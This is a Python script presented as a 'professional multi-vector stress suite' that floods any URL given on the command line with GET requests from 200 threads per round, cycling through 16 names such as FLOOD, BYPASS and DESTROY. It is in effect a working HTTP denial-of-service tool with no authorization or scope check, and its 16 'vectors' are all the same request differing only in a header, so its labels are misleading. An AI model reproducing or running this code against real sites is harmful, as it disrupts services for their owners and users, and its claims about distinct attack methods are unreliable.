import threading
import requests
import time
import sys
import os

# --- PROFESSIONAL VECTOR CONFIGURATION ---
# 16 Attack Vectors for Layer 7 Analysis
VECTORS = [
    "FLOOD", "GLORY", "CIBI", "QUANTUM", "PIDORAS", "BYPASS", 
    "THUNDER", "DESTROY", "FLOODVIP", "MIXBIL", "H2-FUMI", 
    "H2-DEVIL", "H2-BYPASS", "H2-FLOOD", "HTTPCOSTUM", "ULTRA"
]

sent_count = 0
stop_vector = False

def request_engine(target, vector_name):
    global sent_count, stop_vector
    # Professional Headers (No Random Fake Data)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Connection': 'keep-alive',
        'X-Request-Vector': vector_name
    }
    
    while not stop_vector:
        try:
            # Persistent HTTP/1.1 Connection
            response = requests.get(target, headers=headers, timeout=5)
            sent_count += 1
            sys.stdout.write(f"\r\033[1;32m[+] VECTOR: {vector_name} | TARGET: {target} | SENT: {sent_count} | STATUS: {response.status_code}\033[0m")
            sys.stdout.flush()
        except:
            # Auto-retry if server throttles
            continue

def run_suite():
    if len(sys.argv) < 2:
        os.system('clear')
        print("\033[1;31m[!] USAGE: python master.py <url>\033[0m")
        sys.exit()

    target = sys.argv[1]
    global sent_count, stop_vector

    os.system('clear')
    print("\033[1;34m" + "="*65)
    print("      PROFESSIONAL MULTI-VECTOR STRESS SUITE - V12.0      ")
    print("="*65 + "\033[0m")
    print(f"[*] Target URI    : {target}")
    print(f"[*] Total Vectors : {len(VECTORS)}")
    print(f"[*] Thread Pool   : 200 (Optimized for Mobile)")
    print("-" * 65 + "\n")

    for vector in VECTORS:
        print(f"\033[1;33m[*] INITIATING VECTOR: {vector} ...\033[0m")
        sent_count = 0
        stop_vector = False
        
        # Launching 200 Threads per Vector (Sir's Logic)
        for i in range(200):
            t = threading.Thread(target=request_engine, args=(target, vector))
            t.daemon = True
            t.start()

        # Each vector runs for 30 seconds before switching
        time.sleep(30) 
        stop_vector = True
        print(f"\n\033[1;36m[#] {vector} completed. Switching to next vector...\033[0m\n")
        time.sleep(2)

if __name__ == "__main__":
    run_suite()
